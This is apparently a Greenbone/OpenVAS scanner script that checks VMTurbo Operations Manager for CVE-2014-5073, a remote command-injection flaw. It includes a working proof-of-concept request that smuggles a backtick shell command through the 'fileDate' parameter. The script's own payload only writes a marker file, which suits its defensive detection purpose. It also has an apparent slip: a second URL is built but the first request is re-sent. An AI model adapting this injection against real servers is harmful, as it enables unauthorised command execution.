CPE = "cpe:/a:vmturbo:operations_manager";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105067" );
	script_bugtraq_id( 69225 );
	script_cve_id( "CVE-2014-5073" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_name( "VMTurbo Operations Manager '/cgi-bin/vmtadmin.cgi' Remote Command Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/69225" );
	script_xref( name: "URL", value: "http://secunia.com/secunia_research/2014-8/" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2014-08-18 14:14:43 +0200 (Mon, 18 Aug 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_vmturbo_operations_manager_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "vmturbo/installed" );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary OS commands
  in the context of the affected application." );
	script_tag( name: "vuldetect", value: "Send two special crafted HTTP GET requests and check the response." );
	script_tag( name: "insight", value: "Input passed via the 'fileDate' GET parameter to /cgi-bin/vmtadmin.cgi
  (when 'callType' is set to 'DOWN' and 'actionType' is set to  'GETBRAND', 'GETINTEGRATE',
  'FULLBACKUP', 'CFGBACKUP', 'EXPORTBACKUP', 'EXPERTDIAGS', or 'EXPORTDIAGS') is not
  properly sanitised before being used to execute commands. This can be exploited to inject
  and execute arbitrary shell commands with privileges of the 'wwwrun' user." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Update to VMTurbo Operations Manager >= 4.6-28657." );
	script_tag( name: "summary", value: "VMTurbo Operations Manager is prone to a remote command-execution
  vulnerability." );
	script_tag( name: "affected", value: "VMTurbo Operations Manager 4.6 and prior are vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
vtstrings = get_vt_strings();
rand = vtstrings["lowercase_rand"];
cmd = "echo%20" + rand + "%20>%20/tmp/vmtbackup.zip";
url = "/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP&fileDate=\"`" + cmd + "`\"";
req = http_get( item: url, port: port );
http_send_recv( port: port, data: req, bodyonly: FALSE );
url = "/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP";
buf = http_send_recv( port: port, data: req, bodyonly: FALSE );
if(buf && IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && egrep( pattern: rand, string: buf )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

